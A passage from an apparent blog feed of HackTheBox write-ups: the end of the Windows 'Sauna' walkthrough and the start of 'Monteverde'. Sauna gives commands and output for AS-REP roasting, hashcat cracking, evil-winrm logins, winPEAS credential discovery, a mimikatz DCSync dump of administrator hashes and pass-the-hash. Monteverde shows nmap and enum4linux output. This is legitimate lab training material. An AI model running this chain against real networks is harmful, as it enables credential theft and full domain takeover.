-|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
-|         uSNChanged: 53269
-|         name: EGOTISTICAL-BANK
-|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
-|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00\xDFX\x98\x14\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC	\xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
-|         creationTime: 132304304332325407
-|         forceLogoff: -9223372036854775808
-|         lockoutDuration: -18000000000
-|         lockOutObservationWindow: -18000000000
-|         lockoutThreshold: 0
-|         maxPwdAge: -36288000000000
-|         minPwdAge: -864000000000
-|         minPwdLength: 7
-|         modifiedCountAtLastProm: 0
-|         nextRid: 1000
-|         pwdProperties: 1
-|         pwdHistoryLength: 24
-|         objectSid: 1-5-21-2966785786-3096785034-1186376766
-|         serverState: 1
-|         uASCompat: 1
-|         modifiedCount: 1
-|         auditingPolicy: \x00\x01
-|         nTMixedDomain: 0
-|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         systemFlags: -1946157056
-|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         isCriticalSystemObject: TRUE
-|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
-|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
-|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         ms-DS-MachineAccountQuota: 10
-|         msDS-Behavior-Version: 7
-|         msDS-PerUserTrustQuota: 1
-|         msDS-AllUsersTrustQuota: 1000
-|         msDS-PerUserTrustTombstonesQuota: 10
-|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         msDS-NcType: 0
-|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
-|         dc: EGOTISTICAL-BANK
-|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
-|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
-Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done at Sat Apr  4 06:13:53 2020 -- 1 IP address (1 host up) scanned in 14.14 seconds&lt;/root&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;
-</code></pre></div></div>
-
-<p>As I tried a bunch of stuff using enum4linux, ldapsearch, rpcclient nothing returned out.</p>
-
-<p><img src="/assets/img/sample/user.png" alt="" />
-So I had to make my own user list from the aboutUs page from the url.</p>
-
-<pre class="center"> <span style="color:yellow">
-fergussmith
-shauncoins
-hugobear
-bowietaylor
-sophiedirver
-stevenkerb
-fsmith
-scoins
-hbear
-btaylor
-dsophie
-sophied
-skerb
-ksteven
-bhugo</span> 
-</pre>
-
-<h3 id="getting-the-tgt">Getting the TGT</h3>
-
-<p>Using GetNPUsers.py, I was able to get the TGT of a user and cracking the TGT using HASHCAT.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py -dc-ip sauna.htb -usersfile users.txt EGOTISTICAL-BANK.LOCAL/
-Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
-
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:eb75b20e0b65a8f0f42c52a06403a767$0423963b218ce13f92bbca4dbab1691b0a0f390bd9070f9524c92f800f46591462f1f5271e4ac41f42bca677e7e7479de436f053f8e4373d3ef45ac872a4c0f5b9073d2f34c05b063c5bac94e9c432fc6c6ea41a15afcc30f324ffcd5137540c0847f2a5a0dadcae7491e3fda91d26c0e929f377ec97a244c291159f02fc5d723cc1f3f5dc5064a6f67ecf56a27aeaf84d005aff8ec3e476e1e1c7f5f0fb20340ec81ea50de0838bcf2489d70ca04920f312b2e7d0827106768d09ea6f07cb117d11547b8ae3752dfc8398f8cb1110332cb6f412f0610f6c3a85ad8cc680d2d61f14de3f5bf59083ed62055b4fb41f3be91b5275f2f23ae411588ac45a65ed2d
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)` 
-</code></pre></div></div>
-
-<h3 id="hashcat">HASHCAT</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dictionary cache hit:
-* Filename..: D:\Wordlist\rockyou.txt
-* Passwords.: 14344387
-* Bytes.....: 139921579
-* Keyspace..: 14344387
-
-$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63efdef11ee2782d87399829857e$2109910f4bf10633f492b1b882805e4330caaa318fb715b4c04c0516f988fd06bfdeec8c2aa9a72bb8a1683ffe124e9ad6e67461be0c6ec8b423996a07217ab2c5835e1743318ab28f882f09a99ebc94409d4716cd6863e153003e62c24897b231f49daf725b7e98e3fd89d973e7c73613c9c0cafedbf341b1c93f451d5f07775ca94df35dbd858a7864e9c83182f93f88023b2ccbc8c584d7c4600a971b17614def93c8e270be2375d25717590e9c3edd83b618775dd812cd3c1c14bea8b3a6416249b9f6d5e4f9f249589c22dca0c75f4eb60fe0500ef78f72038391d2b239807f45587c3c097482d29761ff9ddd3554d6f15bf2b409a545b59d5196faa0d7:Thestrokes23
-Cracking performance lower than expected?
-
-* Append -O to the commandline.
-  This lowers the maximum supported password- and salt-length (typically down to 32).
-
-* Append -w 3 to the commandline.
-  This can cause your screen to lag.
-
-* Update your OpenCL runtime / driver the right way:
-  https://hashcat.net/faq/wrongdriver
-
-* Create more work items to make use of your parallelization power:
-  https://hashcat.net/faq/morework
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Type........: Kerberos 5 AS-REP etype 23
-Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63e...faa0d7
-Time.Started.....: Sat Apr 04 16:02:10 2020 (5 secs)
-Time.Estimated...: Sat Apr 04 16:02:15 2020 (0 secs)
-Guess.Base.......: File (D:\Wordlist\rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:  2001.8 kH/s (12.17ms) @ Accel:256 Loops:1 Thr:64 Vec:1
-Speed.#2.........:    93174 H/s (7.22ms) @ Accel:4 Loops:1 Thr:64 Vec:1
-Speed.#*.........:  2094.9 kH/s
-Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
-Progress.........: 10543104/14344387 (73.50%)
-Rejected.........: 0/10543104 (0.00%)
-Restore.Point....: 10455040/14344387 (72.89%)
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
-Candidates.#1....: _20003479KNL -&gt; Teague51
-Candidates.#2....: a0122455276 -&gt; _2000dani
-Hardware.Mon.#1..: Temp: 54c Util: 27% Core: 928MHz Mem:2505MHz Bus:16
-Hardware.Mon.#2..: N/A
-
-Started: Sat Apr 04 16:01:47 2020
-Stopped: Sat Apr 04 16:02:17 2020
-</code></pre></div></div>
-
-<h3 id="getting-usertxt">Getting User.txt</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u fsmith -p Thestrokes23 -i sauna.htb
-
-Evil-WinRM shell v2.3
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; cd ..
-*Evil-WinRM* PS C:\Users\FSmith&gt; cd Desktop
-*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; dir
-
-    Directory: C:\Users\FSmith\Desktop
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        1/23/2020  10:03 AM             34 user.txt
-</code></pre></div></div>
-
-<h3 id="privilege-escalation">privilege escalation</h3>
-
-<p>Uploading and executing <span style="color:yellow">winPEAS</span>, I got some Autologin credentials.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Looking for AutoLogon credentials(T1012)
-&lt;span style="color:yellow"&gt;    Some AutoLogon credentials were found!!&lt;/span&gt;
-    DefaultDomainName             :  35mEGOTISTICALBANK
-&lt;span style="color:yellow"&gt;   DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager&lt;/span&gt;
-&lt;span style="color:yellow"&gt;   DefaultPassword               :  Moneymakestheworldgoround! &lt;/span&gt;
-</code></pre></div></div>
-
-<p>Logging in as svc_loanmanager has not worked for me. Trying in a bunch of different ways I found the user name is [svc_loanmgr].</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc_loanmgr\Desktop&gt; whoami /all
-
-USER INFORMATION
-----------------
-
-User Name                   SID
-=========================== ==============================================
-egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108
-
-GROUP INFORMATION
------------------
-
-Group Name                                  Type             SID          Attributes
-=========================================== ================ ============ ==================================================
-Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                    State
-============================= ============================== =======
-SeMachineAccountPrivilege     Add workstations to domain     Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
-USER CLAIMS INFORMATION
------------------------
-
-User claims unknown.
-
-Kerberos support for Dynamic Access Control on this device has been disabled.
-</code></pre></div></div>
-
-<p>As nothing seems to be intresting from [whoami /all], I used [BloodHound] to see the structure of the domain.<br />
-<img src="/assets/img/sample/dcsync.png" alt="" /><br />
-Seeing svc_loanmanager having the rights of DCsync, I moved to mimikatz to dump the hash of administrator.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mimikatz.exe "lsadump::dcsync /user:administrator" "exit"
-
-  .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18:30:37
-.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
-## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
-## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
-'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
-
-mimikatz(commandline) # lsadump::dcsync /user:administrator
-[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
-[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
-[DC] 'administrator' will be the user account
-
-Object RDN           : Administrator
-
-** SAM ACCOUNT **
-
-SAM Username         : Administrator
-Account Type         : 30000000 ( USER_OBJECT )
-User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
-Account expiration   :
-Password last change : 1/24/2020 10:14:15 AM
-Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
-Object Relative ID   : 500
-
-Credentials:
-  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
-    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
-    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
-    lm  - 0: ee8c50e6bc332970a8e8a632488f5211
-
-Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : caab2b641b39e342e0bdfcd150b1683e
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
-      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
-      des_cbc_md5       (4096) : 19d5f15d689b1ce5
-    OldCredentials
-      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
-      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
-      des_cbc_md5       (4096) : d9379d13f7c15d1c
-
-* Primary:Kerberos *
-    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
-    Credentials
-      des_cbc_md5       : 19d5f15d689b1ce5
-    OldCredentials
-      des_cbc_md5       : d9379d13f7c15d1c
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:WDigest *
-    01  3fbea1ff422da035f1dc9b0ce45e84ea
-    02  708091daa9db25abbd1d94246e4257e2
-    03  417f2e40d5be8d436af749ed9fddb0b0
-    04  3fbea1ff422da035f1dc9b0ce45e84ea
-    05  50cb7cfb64edf83218804d934e30d431
-    06  781dbcf7b8f9079382a1948f26f561ee
-    07  4052111530264023a7d445957f5146e6
-    08  8f4bffc5d94cc294272cd0c836e15c47
-    09  0c81bc892ea87f7dd0f4a3a05b51f158
-    10  f8c10a5bd37ea2568976d47ef12e55b9
-    11  8f4bffc5d94cc294272cd0c836e15c47
-    12  023b04503e3eef421de2fcaf8ba1297d
-    13  613839caf0cf709da25991e2e5cb63cf
-    14  16974c015c9905fb27e55a52dc14dfb0
-    15  3c8af7ccd5e9bd131849990d6f18954b
-    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
-    17  6eeda5f64e4adef4c299717eafbd2850
-    18  3b32ec94978feeac76ba92b312114e2c
-    19  b25058bc1ebfcac10605d39f65bff67f
-    20  89e75cc6957728117eb1192e739e5235
-    21  7e6d891c956f186006f07f15719a8a4e
-    22  a2cada693715ecc5725a235d3439e6a2
-    23  79e1db34d98ccd050b493138a3591683
-    24  1f29ace4f232ebce1a60a48a45593205
-    25  9233c8df5a28ee96900cc8b59a731923
-    26  08c02557056f293aab47eccf1186c100
-    27  695caa49e68da1ae78c1523b3442e230
-    28  57d7b68bd2f06eae3ba10ca342e62a78
-    29  3f14bb208435674e6a1cb8a957478c18
-
-mimikatz(commandline) # exit
-Bye! 
-</code></pre></div></div>
-
-<h3 id="getting-roottxt">Getting root.txt</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i sauna.htb
-</code></pre></div></div>
-
-<h2 id="and-we-get-the-shell-as-administrator">And we get the shell as administrator</h2>
-
-<p><img src="/assets/img/sample/sauna-root.png" alt="" /></p>
-
-<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
-
-<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="hackthebox" /><category term="windows," /><category term="activedirectory," /><category term="evilwinrm," /><category term="hashcat," /><category term="impacket," /><category term="bloodhound," /><category term="mimikatz," /><category term="rpcclient" /><summary type="html"><![CDATA[Sauna is one of the machines currently a Active machine on the HackTheBox hacking platform and is of easy difficulty. In this case it is a machine based on the Windows Operating System. Need to gather the user name from the aboutUs page, cracking the TGT of the users, cracking the hash of the user, running winPEAS, using BloodHound and mimikatz for privilege escalation.]]></summary></entry><entry><title type="html">HackTheBox Monteverde</title><link href="http://localhost:4000/hackthebox/Monteverde/" rel="alternate" type="text/html" title="HackTheBox Monteverde" /><published>2020-06-12T00:00:00+05:30</published><updated>2020-06-12T00:00:00+05:30</updated><id>http://localhost:4000/hackthebox/Monteverde</id><content type="html" xml:base="http://localhost:4000/hackthebox/Monteverde/"><![CDATA[<h3 id="tarting-with-nmap-scan-to-see-which-ports-are-open">$tarting with NMAP Scan to see which ports are open.</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 01:39 EDT
-    Nmap scan report for monteverde.htb (10.10.10.172)
-    Host is up (0.35s latency).
-    Not shown: 989 filtered ports
-    PORT     STATE SERVICE       VERSION
-    53/tcp   open  domain?
-    | fingerprint-strings: 
-    |   DNSVersionBindReqTCP: 
-    |     version
-    |_    bind
-    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-12 04:53:41Z)
-    135/tcp  open  msrpc         Microsoft Windows RPC
-    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
-    445/tcp  open  microsoft-ds?
-    464/tcp  open  kpasswd5?
-    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-    636/tcp  open  tcpwrapped
-    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
-    3269/tcp open  tcpwrapped
-    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-    SF-Port53-TCP:V=7.80%I=7%D=6/12%Time=5EE31533%P=x86_64-pc-linux-gnu%r(DNSV
-    SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
-    SF:x04bind\0\0\x10\0\x03");
-    Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-    Host script results:
-    |_clock-skew: -46m18s
-    | smb2-security-mode: 
-    |   2.02: 
-    |_    Message signing enabled and required
-    | smb2-time: 
-    |   date: 2020-06-12T04:56:07
-    |_  start_date: N/A
-    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-    Nmap done: 1 IP address (1 host up) scanned in 333.84 seconds` 
-</code></pre></div></div>
-
-<h3 id="enum4linux-as-the-next-step-if-i-can-see-any-user-names-and-some-juicy-information">Enum4linux as the next step if I can see any user names and some juicy information.</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ENUM4LINUX:
-    =============================== 
-    |    Users on monteverde.htb    |
-    =============================== 
-    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
-    index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
-    index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
-    index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
-    index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
-    index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
-    index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
-    index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
-    index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
-    index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
-    index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
-
-    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
-    user:[Guest] rid:[0x1f5]
-    user:[AAD_987d7f2f57d2] rid:[0x450]
-    user:[mhope] rid:[0x641]
-    user:[SABatchJobs] rid:[0xa2a]
-    user:[svc-ata] rid:[0xa2b]
-    user:[svc-bexec] rid:[0xa2c]
-    user:[svc-netapp] rid:[0xa2d]
-    user:[dgalanos] rid:[0xa35]
-    user:[roleary] rid:[0xa36]
-    user:[smorgan] rid:[0xa37]
-    =========================================== 
-    |    Share Enumeration on monteverde.htb    |
-    =========================================== 
-    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
-    Sharename       Type      Comment
-    ---------       ----      -------
-    SMB1 disabled -- no workgroup available
-    [+] Attempting to map shares on monteverde.htb
-    ====================================================== 
-    |    Password Policy Information for monteverde.htb    |
-    ====================================================== 
-    [+] Attaching to monteverde.htb using a NULL share
-    [+] Trying protocol 139/SMB...
-    [!] Protocol failed: Cannot request session (Called Name:MONTEVERDE.HTB)
-    [+] Trying protocol 445/SMB...
-    [+] Found domain(s):
-    [+] MEGABANK
-    [+] Builtin
-    [+] Password Info for Domain: MEGABANK
-    [+] Minimum password length: 7
-    [+] Password history length: 24
-    [+] Maximum password age: 41 days 23 hours 53 minutes 
-    [+] Password Complexity Flags: 000000
-    [+] Domain Refuse Password Change: 0
-    [+] Domain Password Store Cleartext: 0
-    [+] Domain Password Lockout Admins: 0
-    [+] Domain Password No Clear Change: 0
-    [+] Domain Password No Anon Change: 0
-    [+] Domain Password Complex: 0
-    [+] Minimum password age: 1 day 4 minutes 
-    [+] Reset Account Lockout Counter: 30 minutes 
-    [+] Locked Account Duration: 30 minutes 
-    [+] Account Lockout Threshold: None
-    [+] Forced Log off Time: Not Set
-    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
-    [+] Retieved partial password policy with rpcclient:
-    Password Complexity: Disabled
-    Minimum Password Length: 7
-    ================================ 
-    |    Groups on monteverde.htb    |
-    ================================ 
-    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
-    [+] Getting builtin groups:
-    group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
-    group:[Incoming Forest Trust Builders] rid:[0x22d]
-    group:[Windows Authorization Access Group] rid:[0x230]
-    group:[Terminal Server License Servers] rid:[0x231]
-    group:[Users] rid:[0x221]
-    group:[Guests] rid:[0x222]
-    group:[Remote Desktop Users] rid:[0x22b]
-    group:[Network Configuration Operators] rid:[0x22c]
-    group:[Performance Monitor Users] rid:[0x22e]
-    group:[Performance Log Users] rid:[0x22f]
-    group:[Distributed COM Users] rid:[0x232]
-    group:[IIS_IUSRS] rid:[0x238]
-    group:[Cryptographic Operators] rid:[0x239]
-    group:[Event Log Readers] rid:[0x23d]
-    group:[Certificate Service DCOM Access] rid:[0x23e]
-    group:[RDS Remote Access Servers] rid:[0x23f]
-    group:[RDS Endpoint Servers] rid:[0x240]
-    group:[RDS Management Servers] rid:[0x241]
-    group:[Hyper-V Administrators] rid:[0x242]
-    group:[Access Control Assistance Operators] rid:[0x243]
-    group:[Remote Management Users] rid:[0x244]
-    group:[Storage Replica Administrators] rid:[0x246]
-    =========================================== 
-    |    Share Enumeration on monteverde.htb    |
-    =========================================== 
-    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
-    Sharename       Type      Comment
-    ---------       ----      -------
-    SMB1 disabled -- no workgroup available
-    [+] Attempting to map shares on monteverde.htb
-    ====================================================== 
-    |    Password Policy Information for monteverde.htb    |
-    ====================================================== 
-    [+] Attaching to monteverde.htb using a NULL share
-    [+] Trying protocol 139/SMB...
-    [!] Protocol failed: Cannot request session (Called Name:MONTEVERDE.HTB)
-    [+] Trying protocol 445/SMB...
-    [+] Found domain(s):
-    [+] MEGABANK
-    [+] Builtin
-    [+] Password Info for Domain: MEGABANK
-    [+] Minimum password length: 7
